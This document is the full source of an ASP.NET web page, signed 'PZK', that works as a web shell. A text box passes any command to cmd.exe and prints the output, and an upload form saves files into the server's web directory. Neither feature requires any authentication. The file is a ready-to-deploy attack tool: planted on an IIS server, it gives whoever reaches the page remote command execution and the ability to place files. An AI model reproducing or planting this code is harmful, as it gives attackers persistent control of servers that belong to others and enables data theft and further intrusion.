<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
    string dir = Page.MapPath(".") + "\\";

	// receive files ?
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}

     // command
    if (txtCmdIn.Text.Length > 0)
    {
        Process p = new Process();
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();

        lblCmdOut.Text = txtCmdIn.Text + " " + p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        txtCmdIn.Text = "";
    }
%>

<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta charset="utf-8" />
    <title>[PZK]</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link rel="stylesheet" href="//bootswatch.com/flatly/bootstrap.min.css" media="screen">
    <link rel="stylesheet" href="//bootswatch.com/assets/css/custom.min.css">
</head>
<body>
    <div class="container-fluid">
        <form id="form1" runat="server">
            <div class="row">
                <div class="col-sm-6">
                    <div class="form-group">
                        <div class="input-group">
                            <span class="input-group-addon">command ></span>
                            <asp:TextBox runat="server" ID="txtCmdIn" placeholder="type command here" class="form-control" autofocus />
                            <span class="input-group-btn">
                                <asp:Button class="btn btn-warning" runat="server" ID="Button1" Text="execute" />
                            </span>
                        </div>
                    </div>
                </div>
                <div class="col-sm-6">
                    <div class="form-group">
                        <div class="input-group">
                            <span class="input-group-addon">File upload ></span>
                            <asp:FileUpload class="form-control" runat="server" ID="flUp" />
                            <span class="input-group-btn">
                                <asp:Button class="btn btn-warning" runat="server" ID="cmdUpload" Text="Upload" />
                            </span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="well well-sm">
                <pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
            </div>
        </form>
        <hr />
        <footer>
            <div class="row">
                <div class="col-lg-12">
                    <ul class="list-unstyled">
                        <li class="pull-right"><a href="#top">Back to top</a></li>
                        <li>
                            <p>Copyright © 2017 PZK</p>
                        </li>
                    </ul>
                </div>
            </div>
        </footer>
    </div>
</body>
</html>